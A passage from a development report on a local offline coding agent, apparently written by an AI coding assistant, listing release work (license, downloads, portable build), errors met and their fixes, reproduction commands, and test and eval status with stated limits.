**Numbers.** Tests 141 → **201** (60 new, all passing; 2 skipped as before), ruff and mypy clean, docs audit **35 pages**
(two new: `localserver.md`, `check_commit.md`).

## 6h. Phase 11: a license, the real offline model, and a product to download
**Your requests:** "make the necessary license", the memory is now free for checking the local model, refine the
product as much as possible, and work on the next step (making it downloadable, before the website).

| # | Done | Why / evidence |
|---|---|---|
| 1 | MIT license, third-party notices (llama.cpp, LLVM OpenMP, Qwen3, ruff, mypy, embeddable Python), license metadata | the most common license for developer tools; a bundle that carries other people's programs must carry their licenses |
| 2 | The real offline model tested end to end, and a byte-order-mark bug fixed | see section 6g: 9 calls → 4 calls, no false failure |
| 3 | `localagent setup` and `localagent models` | a downloaded product must set itself up; checked live on this PC (everything found, nothing downloaded) |
| 4 | `fetch.py`: verified, resumable downloads | Hugging Face's CDN answered a Range request with 206 and the right bytes (GGUF signature), so a 5 GB download continues after a break |
| 5 | The download sources checked before writing the code | python.org offers embeddable zips only for bug-fix releases (3.12.16 and 3.13.18 were source-only), so the bundle uses 3.14.10; llama.cpp's "latest" release was a placeholder (`v1.0.0`) and the builds are `b12588` and similar; Linux and macOS builds are `.tar.gz`, Windows ones `.zip` |
| 6 | The portable Windows zip and the wheel (`tools/build_release.py`) | 35.7 MB, built in 88 s; unzipped into an empty folder it worked without any installed Python: `--version`, ruff 0.17.6 and mypy 2.4.1 found, broken code rejected (F821), `--doctor` correct, a real request answered in 1 call / 9.7 s |
| 7 | Messages say "run: localagent setup" instead of naming a docs file | the bundle's doctor told users to "see docs/01-setup-and-models.md", which a download does not contain |
| 8 | `CHANGELOG.md`, `SECURITY.md`, `CONTRIBUTING.md`; CI adds Python 3.14 | the files people look for on a project page; 3.14 is the bundled Python |

**Git.** The 0.6 work and the license are two commits on the branch `release-0.6` (the guard passed both); this phase
adds a third. Pushing to GitHub was **blocked by Claude Code's safety system** (sending data to an outside service needs
your own action), so the push is yours: `git push -u origin main` and `git push -u origin release-0.6`, then open a pull
request (or `gh pr create`).

## 7. Errors met and how each was fixed
| Symptom | Cause | Fix |
|---|---|---|
| `unittest discover -s tests -t .` ImportError | `tests` was not a package | added `tests/__init__.py` |
| ResourceWarning "Implicitly cleaning up HTTPError" | error response left open | `exc.close()` in `llm.post` |
| ruff F401 unused import in `tools.py` | leftover `Path` import | removed |
| mypy "got object, expected ChatBackend" | untyped registry dict | annotated `BACKENDS` |
| GitHub `/releases/latest` gave a placeholder version | repo's "latest" tag is a stub | used the tags API for build `b12099` |
| PowerShell prints `NativeCommandError` for unittest output | unittest writes progress to stderr | harmless; exit code is what counts |
| Background downloads killed | system critically low on memory | freed memory, resumed with `curl -C -` |
| winget/Ollama stuck at 0 bytes | slow ollama.com route | switched to llama.cpp + Hugging Face |
| `sed` deleting `state_dir` broke a multi-line call in `evals/run_evals.py` (ruff reported a syntax error) | the removed line was in the middle of a call | rewrote that line; ruff and tests clean again |
| `.ps1` check passed a broken file | the PowerShell command was written with doubled braces `{{ }}` (as for Python's `format`), which PowerShell reads as an unused script block | single braces; a broken file now reports `line 1: Missing ')' ...` |
| A test of the TypeScript check failed on valid code | `node --check` parses only JavaScript | Node's `stripTypeScriptTypes` in transform mode |
| `llama-bench -ngl 13+` crashes | GPU out of memory | cap at 11; default 9 for headroom |
| A unit test failed after enabling auto-format | `ruff format` added a blank line to the test's sample code | that test turns `auto_format` off; a new test checks formatting itself |
| The "do nothing" eval test ran out of scripted replies | the nudge now asks the model a second time | test supplies two replies and expects 2 calls |
| `add_method` looped 18 identical edits | greedy decoding + no loop detection | repeat guard (section 6b item 7) |
| Python heredoc scripts wrote real newlines into string literals (twice) | `\n` was converted before Python saw it | repaired with a script that builds the escape from `chr(92)`, and later wrote helper scripts to files instead |
| (0.6) A long Markdown section appended with a shell heredoc failed: "unexpected EOF while looking for matching quote" | the shell tool mangles some quote characters in heredocs | wrote the section to a file with an editor tool and appended it with Python |
| (0.6) mypy: "Cannot infer type of lambda" in the commit guard | a `lambda name=name: ...` default-argument closure | `functools.partial(git, "show", ...)` |
| (0.6) mypy: a variable used first as a list, then as a number, in `context._overview` | one name reused for two meanings | renamed the second (`needed`) |
| (0.6) After the history-fitting change, the compaction test returned the summary as the answer | the test used a 1 000-token window, smaller than the system prompt itself, so trimming dropped the older turns before compaction could run | the test now uses a realistic 3 000-token window; the behaviour is correct |
| (0.6) A live `@file` request still read the attached file (2 calls) | nothing told the model attached files were current | one sentence in prompt rule 1: 1 call, half the tokens |

## 8. How to reproduce everything (commands)
```
# model server (GPU-assisted):             .\serve.ps1            (CPU only: .\serve.ps1 -GpuLayers 0)
# chat with the agent:                     python -m localagent --backend openai --api-base http://127.0.0.1:8080/v1 --model qwen3-8b
# score the model:                         python -m evals.run_evals --backend openai --api-base http://127.0.0.1:8080/v1 --model qwen3-8b [--trace] [--only fix_bug]
# unit tests (no model needed):            .venv\Scripts\python -m unittest discover -s tests -t .
# lint / types:                            .venv\Scripts\python -m ruff check .   and   -m mypy localagent
# rebuild + audit these docs:              .venv\Scripts\python tools\build_docs.py
```

## 9. Status and honest limits
* **Now (version 0.6, 20 Nov 2026):** 216 unit tests pass (real Docker when running, a fake MCP server, fake model and
  llama.cpp servers, local web servers, every installed language checker); ruff and mypy clean; docs audit passes (35
  pages, every code line documented exactly once). The local model was run for real through the new automatic start,
  in auto and offline mode (section 6g). Not yet measured on 0.6: the full eval suite. The CI workflow (Linux +
  Windows) runs on the first push.
* The bullets below are the history of earlier versions, kept as they were written.
* (0.5) 136 unit tests passed; ruff and mypy clean; docs audit passed.
* **Final eval on the real model (Qwen3-8B, 9 GPU layers, temperature 0): 4/4 tasks passed** -
  fizzbuzz 2 calls/88 s, fix_bug 5 calls/82 s, add_method 4 calls/76 s, word_count 2 calls/85 s (about 3-8k tokens each).
  Earlier runs: 2/4, then 3/4 (see section 6). Four tasks is a small sample and an 8B model is not perfectly
  repeatable across prompts; add more tasks to `evals/tasks.py` before drawing strong conclusions.
* **Nine-task suite:** the four original tasks passed 4/4; the five new tasks scored 4/5 on first contact
  (counter_class 4 calls, json_key 2, default_arg 3, add_tests 8 - the write gate rejected two bad test files first -
  and `rename_function` failed). After adding `edit_file all=true`, `rename_function` passed in 4 calls (60 s). So all nine
  tasks have now passed, but across separate runs (code changed in between), not in one single run of the final code.
  Re-run `python -m evals.run_evals ...` for a clean single-run number before comparing models.
* Earlier note (before sections 6b): 3/4 eval tasks on that run. Unit tests prove the *machinery* (gates, rollback, loop, parsing);
  only the evals measure *model quality*, and an 8B local model is much weaker than Claude.
* Speed: ≈4.7 generated tokens/s at best on this PC. A single task takes 1–3 minutes. That is why the agent is built
  around saving tokens and calls.
* Without Docker, `run_python` runs code with your user permissions (after your approval); with `--sandbox docker` it
  runs in the locked-down container (built in Phase 5).
* (until 0.6) The CI workflow file was an untested template; 0.6 added a Windows job and read-only permissions.
